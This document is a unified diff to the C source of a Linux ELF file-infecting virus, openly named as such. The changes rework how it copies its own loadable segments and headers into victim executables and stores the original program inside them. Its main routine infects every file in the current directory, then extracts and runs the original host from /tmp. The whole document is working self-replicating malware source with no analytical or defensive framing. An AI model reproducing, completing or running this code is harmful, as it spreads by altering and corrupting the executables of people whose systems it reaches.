@@ -2,6 +2,8 @@
 #error "Linux only"
 #endif
 
+#include "victim.h"
+
 #include <assert.h>
 #include <elf.h>
 #include <errno.h>
@@ -9,6 +11,7 @@
 #include <fcntl.h>
 #include <limits.h>
 #include <stdbool.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -26,108 +29,235 @@
 
 static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");
 
-typedef struct {
+struct virus_info {
+    uint16_t first_load_index;
+    // first_load_index != PN_XNUM
+    uint16_t last_load_index;
+    // last_load_index != PN_XNUM
+    // first_load_index < last_load_index
     off_t size;
+    // size > 0
     off_t id_offset;
-} virus_info_t;
+    // 0 < id_offset && id_offset < size
+};
 
+enum virus_segment_type {
+    VIRUS_SEGMENT_OTHER = 0,
+    VIRUS_SEGMENT_TEXT,
+    VIRUS_SEGMENT_DATA,
+    VIRUS_SEGMENT_LDATA,
+};
+
+#define DEFINE_ELF_TYPES(N) \
+static_assert(sizeof(uintptr_t) == sizeof(uint##N##_t), "expected " #N "-bit architecture"); \
+typedef Elf##N##_Ehdr elf_header_t; \
+typedef Elf##N##_Phdr elf_program_header_t
+
+#ifdef __LP64__
+DEFINE_ELF_TYPES(64);
+#else
+DEFINE_ELF_TYPES(32);
+#endif
+
+struct elf_headers {
+    elf_header_t header;
+    elf_program_header_t program_headers[];
+};
+static_assert(offsetof(struct elf_headers, program_headers) == sizeof(elf_header_t),
+              "expected no padding between header and program_headders");
+
+struct io_all_result {
+    size_t remaining;
+    int err;
+};
+
+extern const struct elf_headers elf_headers;
+
+extern char mutable_data_begin[];
 static const char virus_id[] = __DATE__ __TIME__;
+extern const char mutable_data_end[];
 
-static int virus_info_error(const virus_info_t *info) {
-    return info->size >= 0 ? 0 : -info->size;
+extern const char mutable_data_init_begin[];
+extern const char mutable_data_init_end[];
+
+static bool elf_segment_contains(const elf_program_header_t *header,
+                                 const void *ptr) {
+    assert(header->p_vaddr <= UINTPTR_MAX - header->p_memsz);
+    uintptr_t end = header->p_vaddr + header->p_memsz;
+    uintptr_t vaddr = (uintptr_t) ptr;
+    return header->p_vaddr <= vaddr && vaddr < end;
 }
 
-#include "compute-virus-info-32.c"
-#include "compute-virus-info-64.c"
-
-virus_info_t compute_virus_info(FILE *file) {
-    unsigned char identifier[EI_NIDENT];
-
-    if (fread(identifier, sizeof(identifier), 1, file) == 0) {
-        assert(ferror(file));
-        return (virus_info_t) { .size = -errno, .id_offset = -1 };
-    }
-
-    rewind(file);
-
-    switch (identifier[EI_CLASS]) {
-        case ELFCLASS32:
-            return compute_virus_info_32(file);
-        case ELFCLASS64:
-            return compute_virus_info_64(file);
-        default:
-            assert(false);
-            return (virus_info_t) { .size = -ENOEXEC, .id_offset = -1 };
-    }
+static enum virus_segment_type virus_segment_type(const elf_program_header_t *header) {
+    return elf_segment_contains(header, &elf_headers)
+        ? VIRUS_SEGMENT_TEXT
+        : elf_segment_contains(header, mutable_data_begin)
+        ? VIRUS_SEGMENT_DATA
+        : elf_segment_contains(header, &virus_victim)
+        ? VIRUS_SEGMENT_LDATA
+        : VIRUS_SEGMENT_OTHER;
 }
 
-size_t read_all(int fd, void *buf, size_t remaining) {
-    char *ptr = buf;
-    while (remaining > 0) {
-        ssize_t result = read(fd, ptr, remaining);
-        if (result < 0) break;
-        if (result == 0) {
-            errno = EINVAL;
-            break;
-        }
-        ptr += result;
-        remaining -= result;
-    }
-    return remaining;
-}
+static const struct virus_info *virus_info(void) {
+    static bool once = false;
+    static struct virus_info info = {
+        .first_load_index = PN_XNUM,
+        .last_load_index = PN_XNUM,
+        .size = 0,
+        .id_offset = 0,
+    };
+    if (!once) {
+        assert((mutable_data_end - mutable_data_begin)
+            == (mutable_data_init_end - mutable_data_init_begin));
 
-size_t write_all(int fd, const void *buf, size_t remaining) {
-    const char *ptr = buf;
-    while (remaining > 0) {
-        ssize_t result = write(fd, ptr, remaining);
-        if (result < 0) break;
-        ptr += result;
-        remaining -= result;
-    }
-    return remaining;
-}
+        assert(elf_headers.header.e_phnum != PN_XNUM);
 
-int writev_all(int fd, struct iovec *iov, int remaining) {
-    while (remaining > 0) {
-        ssize_t result = writev(fd, iov, remaining);
-        if (result < 0) break;
-        while (remaining > 0) {
-            if ((size_t) result >= iov->iov_len) {
-                result -= iov->iov_len;
-                ++iov;
-                --remaining;
-            } else {
-                iov->iov_base = result + (char *) iov->iov_base;
-                iov->iov_len -= result;
-                break;
+        uint16_t ldata_index = PN_XNUM;
+        for (uint16_t i = 0; i < elf_headers.header.e_phnum; ++i) {
+            const elf_program_header_t *header = &elf_headers.program_headers[i];
+            if (header->p_type != PT_LOAD) continue;
+
+            info.last_load_index = i;
+            if (info.first_load_index == PN_XNUM) {
+                info.first_load_index = i;
+            }
+
+            if (virus_segment_type(header) == VIRUS_SEGMENT_LDATA) {
+                ldata_index = i;
+                assert(header->p_vaddr == (uintptr_t) &virus_victim);
+                assert(header->p_offset <= INTPTR_MAX - sizeof(virus_victim.size));
+                info.size = (off_t) (header->p_offset + sizeof(virus_victim.size));
+            } else if (elf_segment_contains(header, virus_id)) {
+                info.id_offset = header->p_offset + ((uintptr_t) virus_id - header->p_vaddr);
             }
         }
+        assert(info.first_load_index != PN_XNUM);
+        assert(info.last_load_index != PN_XNUM);
+        assert(info.first_load_index < info.last_load_index);
+        assert(ldata_index == info.last_load_index);
+        assert(info.size > 0);
+        assert(info.id_offset > 0);
+        assert(info.id_offset < info.size);
+
+        once = true;
     }
-    return remaining;
+    return &info;
 }
 
-size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
-    while (remaining > 0) {
-        ssize_t result = sendfile(out_fd, in_fd, NULL, remaining);
-        if (result < 0) break;
-        remaining -= result;
+static const elf_header_t *victim_header() {
+    static bool once = false;
+    static elf_header_t header;
+    if (!once) {
+        header = elf_headers.header;
+        header.e_shoff = 0;
+        header.e_shnum = 0;
+        header.e_shstrndx = SHN_UNDEF;
+        once = true;
     }
-    return remaining;
+    return &header;
 }
 
-int is_possibly_infected(int fd, off_t size, off_t id_offset) {
-    if (id_offset + (off_t) sizeof(virus_id) > size) {
-        return 0;
-    }
+static elf_program_header_t victim_ldata_header(off_t victim_size) {
+    const struct virus_info *info = virus_info();
+    elf_program_header_t header = elf_headers.program_headers[info->last_load_index];
+    header.p_filesz = header.p_memsz = (uintptr_t) victim_size;
+    return header;
+}
 
-    {
-        off_t result = lseek(fd, 0, SEEK_SET);
-        assert(result == 0);
+struct io_all_result pread_all(int fd, void *buf, size_t count, off_t offset) {
+    struct io_all_result result = { .remaining = count, .err = 0};
+    char *ptr = buf;
+    while (result.remaining > 0) {
+        ssize_t n = pread(fd, ptr, result.remaining, offset);
+        if (n < 0) {
+            result.err = errno;
+            break;
+        }
+        if (n == 0) break;
+        ptr += n;
+        result.remaining -= n;
+        offset += n;
     }
+    return result;
+}
 
+struct io_all_result write_all(int fd, const void *buf, size_t count) {
+    struct io_all_result result = { .remaining = count, .err = 0};
+    const char *ptr = buf;
+    while (result.remaining > 0) {
+        ssize_t n = write(fd, ptr, result.remaining);
+        if (n < 0) {
+            result.err = errno;
+            break;
+        }
+        ptr += n;
+        result.remaining -= n;
+    }
+    return result;
+}
+
+struct io_all_result pwrite_all(int fd, const void *buf, size_t count, off_t offset) {
+    struct io_all_result result = { .remaining = count, .err = 0};
+    const char *ptr = buf;
+    while (result.remaining > 0) {
+        ssize_t n = pwrite(fd, ptr, result.remaining, offset);
+        if (n < 0) {
+            result.err = errno;
+            break;
+        }
+        ptr += n;
+        result.remaining -= n;
+    }
+    return result;
+}
+
+struct io_all_result pwritev_all(int fd, struct iovec *iov, int iovcnt, off_t offset) {
+    struct io_all_result result = { .remaining = iovcnt, .err = 0};
+    while (result.remaining > 0) {
+        ssize_t n = pwritev(fd, iov, result.remaining, offset);
+        if (n < 0) {
+            result.err = errno;
+            break;
+        }
+        offset += n;
+        do {
+            if ((size_t) n >= iov->iov_len) {
+                n -= iov->iov_len;
+                *(const char **) (&iov->iov_base) += iov->iov_len;
+                iov->iov_len = 0;
+                ++iov;
+                --result.remaining;
+            } else {
+                *(const char **) (&iov->iov_base) += n;
+                iov->iov_len -= (ssize_t) n;
+                break;
+            }
+        } while (result.remaining > 0);
+    }
+    return result;
+}
+
+struct io_all_result sendfile_all(int out_fd, int in_fd, off_t in_offset, size_t count) {
+    struct io_all_result result = { .remaining = count, .err = 0};
+    off_t *offset = in_offset >= 0 ? &in_offset : NULL;
+    while (result.remaining > 0) {
+        ssize_t n = sendfile(out_fd, in_fd, offset, result.remaining);
+        if (n < 0) {
+            result.err = errno;
+            break;
+        }
+        if (n == 0) break;
+        result.remaining -= n;
+    }
+    return result;
+}
+
+int is_possibly_infected(int fd) {
     char magic[EI_NIDENT];
-    if (read_all(fd, magic, sizeof(magic)) > 0) {
-        return -errno;
+
+    struct io_all_result result = pread_all(fd, magic, sizeof(magic), 0);
+    if (result.remaining > 0) {
+        return -result.err;
     }
 
     if (magic[EI_MAG0] != ELFMAG0
@@ -137,33 +267,17 @@ int is_possibly_infected(int fd, off_t size, off_t id_offset) {
         return 0;
     }
 
-    uint16_t type;
-    if (read_all(fd, &type, sizeof(type)) > 0) {
-        return -errno;
-    }
-
-    if (type != ET_EXEC) {
-        return 0;
-    }
-
     char buffer[sizeof(virus_id)];
-    {
-        off_t result = lseek(fd, id_offset, SEEK_SET);
-        assert(result == id_offset);
-    }
-    if (read_all(fd, buffer, sizeof(virus_id)) > 0) {
-        return -errno;
-    }
-
-    {
-        off_t result = lseek(fd, 0, SEEK_SET);
-        assert(result == 0);
+    result = pread_all(fd, buffer, sizeof(virus_id), virus_info()->id_offset);
+    if (result.remaining > 0) {
+        return -result.err;
     }
 
     return memcmp(virus_id, buffer, sizeof(virus_id)) == 0;
 }
 
-int infect_by_copy(const char *virus, const virus_info_t *info, const char *path) {
+int infect_by_copy(const char *path) {
+    const struct virus_info *info = virus_info();
     int result = 0;
 
     int fd = open(path, O_RDONLY | O_NOFOLLOW);
@@ -178,7 +292,7 @@ int infect_by_copy(const char *virus, const virus_info_t *info, const char *path
         goto close_fd;
     }
 
-    result = -is_possibly_infected(fd, stat.st_size, info->id_offset);
+    result = -is_possibly_infected(fd);
     if (result > 0) goto close_fd;
     if (result < 0) {
         result = 0;
@@ -202,17 +316,97 @@ int infect_by_copy(const char *virus, const virus_info_t *info, const char *path
     if (result) {
         goto close_tmp;
     }
+
     posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+    for (uint16_t i = info->first_load_index; i <= info->last_load_index; ++i) {
+        const elf_program_header_t *header = &elf_headers.program_headers[i];
+        if (header->p_type != PT_LOAD) continue;
 
-    if (write_all(tmp_fd, virus, info->size) > 0) {
-        result = errno;
-        goto close_tmp;
-    }
+        const void *segment = (const void *) header->p_vaddr;
+        const void *segment_end = (const char *) segment + header->p_filesz;
+        switch (virus_segment_type(header)) {
+            case VIRUS_SEGMENT_OTHER: {
+                struct io_all_result io_result = pwrite_all(
+                    tmp_fd, segment, header->p_filesz, header->p_offset);
+                if (io_result.remaining > 0) {
+                    result = io_result.err;
+                    goto close_tmp;
+                }
+                break;
+            } case VIRUS_SEGMENT_TEXT: {
+                assert(segment == (const void *) &elf_headers);
+                elf_program_header_t ldata_header = victim_ldata_header(info->size);
+                const void *after_ldata_header
+                    = &elf_headers.program_headers[info->last_load_index + 1];
 
-    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
-    if (sendfile_all(tmp_fd, fd, stat.st_size) > 0) {
-        result = errno;
-        goto close_tmp;
+                enum { iovcnt = 4 };
+                struct iovec iov[iovcnt] = {
+                    { .iov_base = (void *) victim_header(),
+                      .iov_len = sizeof(*victim_header()) },
+                    { .iov_base = (void *) elf_headers.program_headers,
+                      .iov_len = info->last_load_index * sizeof(elf_program_header_t) },
+                    { .iov_base = &ldata_header,
+                      .iov_len = sizeof(ldata_header) },
+                    { .iov_base = (void *) after_ldata_header,
+                      .iov_len = (const char *) segment_end - (const char *) after_ldata_header },
+                };
+
+                struct io_all_result io_result = pwritev_all(
+                    tmp_fd, iov, iovcnt, header->p_offset);
+                if (io_result.remaining > 0) {
+                    result = io_result.err;
+                    goto close_tmp;
+                }
+                break;
+            } case VIRUS_SEGMENT_DATA: {
+                ptrdiff_t mutable_data_offset = mutable_data_begin - (const char *) segment;
+                ptrdiff_t mutable_data_size = mutable_data_end - mutable_data_begin;
+
+                enum { iovcnt = 3 };
+                struct iovec iov[iovcnt] = {
+                    { .iov_base = (void *) segment,
+                      .iov_len = mutable_data_offset },
+                    { .iov_base = (void *) mutable_data_init_begin,
+                      .iov_len = mutable_data_size },
+                    { .iov_base = (void *) mutable_data_end,
+                      .iov_len = (const char *) segment_end - mutable_data_end },
+                };
+
+                struct io_all_result io_result = pwritev_all(
+                    tmp_fd, iov, iovcnt, header->p_offset);
+                if (io_result.remaining > 0) {
+                    result = io_result.err;
+                    goto close_tmp;
+                }
+                break;
+            } case VIRUS_SEGMENT_LDATA: {
+                assert(segment == (const void *) &virus_victim);
+                struct io_all_result io_result = pwrite_all(
+                    tmp_fd,
+                    &stat.st_size, sizeof(stat.st_size),
+                    header->p_offset);
+                if (io_result.remaining > 0) {
+                    result = io_result.err;
+                    goto close_tmp;
+                }
+
+                off_t desired_offset = header->p_offset + offsetof(struct virus_victim,
+                                                                   content);
+                off_t offset = lseek(tmp_fd, desired_offset, SEEK_SET);
+                if (offset != desired_offset) {
+                    result = errno;
+                    goto close_tmp;
+                }
+
+                posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+                io_result = sendfile_all(tmp_fd, fd, 0, stat.st_size);
+                if (io_result.remaining > 0) {
+                    result = io_result.err ? io_result.err : EINVAL;
+                    goto close_tmp;
+                }
+                break;
+            }
+        }
     }
 
     result = fsync(tmp_fd);
@@ -240,14 +434,15 @@ exit:
     return result;
 }
 
-int infect(const char *virus, const virus_info_t *info, const char *path) {
+int infect(const char *path) {
+    const struct virus_info *info = virus_info();
     int result = 0;
 
     int fd = open(path, O_RDWR);
     if (fd == -1) {
         return errno == EISDIR
             ? errno
-            : infect_by_copy(virus, info, path);
+            : infect_by_copy(path);
     }
 
     struct stat stat;
@@ -256,7 +451,7 @@ int infect(const char *virus, const virus_info_t *info, const char *path) {
         goto close_fd;
     }
 
-    result = -is_possibly_infected(fd, stat.st_size, info->id_offset);
+    result = -is_possibly_infected(fd);
     if (result > 0) goto close_fd;
     if (result < 0) {
         result = 0;
@@ -269,16 +464,66 @@ int infect(const char *virus, const virus_info_t *info, const char *path) {
     }
 
     off_t new_size = stat.st_size + info->size;
-    char *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    void *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     if (content == MAP_FAILED) {
         close(fd);
-        return infect_by_copy(virus, info, path);
+        return infect_by_copy(path);
     }
 
+    off_t victim_offset = info->size - sizeof(virus_victim.size);
+    struct virus_victim *victim = (void *) ((char *) content + victim_offset);
     posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
-    memmove(content + info->size, content, stat.st_size);
-    posix_madvise(content, info->size, POSIX_MADV_SEQUENTIAL);
-    memcpy(content, virus, info->size);
+    memmove(victim->content, content, stat.st_size);
+    victim->size = stat.st_size;
+
+    posix_madvise(content, victim_offset, POSIX_MADV_SEQUENTIAL);
+    for (uint16_t i = info->first_load_index; i < info->last_load_index; ++i) {
+        const elf_program_header_t *header = &elf_headers.program_headers[i];
+        if (header->p_type != PT_LOAD) continue;
+
+        const char *segment = (const void *) header->p_vaddr;
+        char *buf = (char *) content + header->p_offset;
+        char *buf_mem_end = buf + header->p_memsz;
+        char *buf_end = buf + header->p_filesz;
+        assert(buf_end <= buf_mem_end);
+        switch (virus_segment_type(header)) {
+            case VIRUS_SEGMENT_OTHER: {
+                memcpy(buf, segment, header->p_memsz);
+                break;
+            } case VIRUS_SEGMENT_TEXT: {
+                struct elf_headers *headers = content;
+                assert(content == buf);
+                elf_program_header_t *ldata_header
+                    = &headers->program_headers[info->last_load_index];
+
+                headers->header = *victim_header();
+                memcpy(headers->program_headers,
+                       elf_headers.program_headers,
+                       info->last_load_index * sizeof(elf_program_header_t));
+                *ldata_header = victim_ldata_header(info->size);
+                memcpy(ldata_header + 1,
+                       &elf_headers.program_headers[info->last_load_index + 1],
+                       buf_mem_end - (char *) (ldata_header + 1));
+                break;
+            } case VIRUS_SEGMENT_DATA: {
+                ptrdiff_t mutable_data_offset = mutable_data_begin - segment;
+                ptrdiff_t mutable_data_size = mutable_data_end - mutable_data_begin;
+                char *buf_data_begin = buf + mutable_data_offset;
+                char *buf_data_end = buf_data_begin + mutable_data_size;
+                memcpy(buf, segment, mutable_data_offset);
+                memcpy(buf_data_begin,
+                       mutable_data_init_begin,
+                       mutable_data_init_end - mutable_data_init_begin);
+                memcpy(buf_data_end,
+                       mutable_data_end,
+                       buf_mem_end - buf_data_end);
+                break;
+            } case VIRUS_SEGMENT_LDATA: {
+                assert(false);
+            }
+        }
+        memset(buf_end, 0, buf_mem_end - buf_end);
+    }
     
     {
         int result = munmap(content, new_size);
@@ -293,99 +538,62 @@ close_fd:
 
 int main(int argc, char *const argv[], char *const envp[]) {
     (void)argc;
+    DIR *dir = opendir(".");
+    if (dir) {
+        struct dirent entry;
+        struct dirent *result;
+        while (true) {
+            int error = readdir_r(dir, &entry, &result); 
+            assert(!error);
+            if (!result) break;
 
-    FILE *exe_file = fopen("/proc/self/exe", "r");
-    if (!exe_file) {
-        fprintf(stderr, "could not open /proc/self/exe for reading: %s\n", strerror(errno));
-        goto exit;
-    }
-    int exe_fd = fileno(exe_file);
-    assert(exe_fd != -1);
-
-    virus_info_t info = compute_virus_info(exe_file);
-    int error = virus_info_error(&info);
-    if (error) {
-        fprintf(stderr, "could not determine size: %s\n", strerror(error));
-        goto close_exe;
-    }
-    setbuf(exe_file, NULL);
-
-    struct stat exe_stat;
-    if (fstat(exe_fd, &exe_stat)) {
-        fprintf(stderr, "could not stat /proc/self/exe: %s\n", strerror(errno));
-        goto close_exe;
-    }
-    assert(exe_stat.st_size >= info.size);
-
-    char *virus = mmap(NULL, info.size, PROT_READ, MAP_SHARED, exe_fd, 0);
-    if (virus == MAP_FAILED) {
-        fprintf(stderr, "cannot memory-map %zu-byte virus: %s\n", 
-                (size_t) info.size, strerror(errno));
-    } else {
-        DIR *dir = opendir(".");
-        if (dir) {
-            struct dirent entry;
-            struct dirent *result;
-            posix_madvise(virus, info.size, POSIX_MADV_WILLNEED);
-            while (true) {
-                int error = readdir_r(dir, &entry, &result); 
-                assert(!error);
-                if (!result) break;
-
-                error = infect(virus, &info, entry.d_name);
-                if (error) {
-                    fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
-                }
+            error = infect(entry.d_name);
+            if (error) {
+                fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
             }
-            closedir(dir);
-        } else {
-            fprintf(stderr, "cannot open .: %s\n", strerror(errno));
         }
-        int error = munmap(virus, info.size);
-        assert(!error);
+        closedir(dir);
+    } else {
+        fprintf(stderr, "cannot open .: %s\n", strerror(errno));
     }
 
-    off_t actual_size = exe_stat.st_size - info.size;
-    if (actual_size == 0) {
-        fclose(exe_file);
+    if (virus_victim.size == 0) {
         return 0;
     }
+    assert(virus_victim.size > 0);
 
     char tmp_path[] = "/tmp/XXXXXX";
     int tmp_fd = mkstemp(tmp_path);
     if (tmp_fd == -1) {
         fprintf(stderr, "cannot create temporary file in /tmp: %s\n", strerror(errno));
-        goto close_exe;
+        goto exit;
     }
 
     {
-        int result = posix_fallocate(tmp_fd, 0, actual_size);
+        int result = posix_fallocate(tmp_fd, 0, virus_victim.size);
         if (result) {
             fprintf(stderr, "cannot allocate %zu bytes for %s: %s\n",
-                    (size_t) actual_size, tmp_path, strerror(result));
+                    (size_t) virus_victim.size, tmp_path, strerror(result));
             goto close_tmp;
         }
     }
 
-    {
-        int result = lseek(exe_fd, info.size, SEEK_SET);
-        assert(result != -1);
-    }
-    posix_fadvise(exe_fd, info.size, actual_size, POSIX_FADV_SEQUENTIAL);
     posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
     {
-        size_t remaining = sendfile_all(tmp_fd, exe_fd, actual_size);
-        if (remaining > 0) {
+        struct io_all_result result = write_all(tmp_fd, virus_victim.content, virus_victim.size);
+        if (result.remaining > 0) {
             fprintf(stderr,
-                    "cannot write remaining %zu of %zu bytes "
+                    "cannot write %zu of %zu bytes "
                     "from /proc/self/exe to %s: %s\n",
-                    remaining, (size_t) actual_size, tmp_path, strerror(errno));
+                    result.remaining, (size_t) virus_victim.size, tmp_path, strerror(result.err));
             goto close_tmp;
         }
     }
 
     {
-        mode_t mode = ~S_IFMT & exe_stat.st_mode;
+        static_assert(sizeof(mode_t) <= sizeof(int),
+                      "Expected mode_t to fit in int");
+        mode_t mode = S_IRUSR | S_IXUSR;
         int result = fchmod(tmp_fd, mode);
         if (result == -1) {
             fprintf(stderr, "cannot set permissions of %s to %o: %s\n",
@@ -407,7 +615,6 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
     close(tmp_fd);
     unlink(tmp_path);
-    fclose(exe_file);
     fexecve(tmp_fd2, argv, envp);
     fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
     close(tmp_fd2);
@@ -417,9 +624,6 @@ close_tmp:
     close(tmp_fd);
     unlink(tmp_path);
 
-close_exe:
-    fclose(exe_file);
-    
 exit:
     return EXIT_FAILURE;
 }
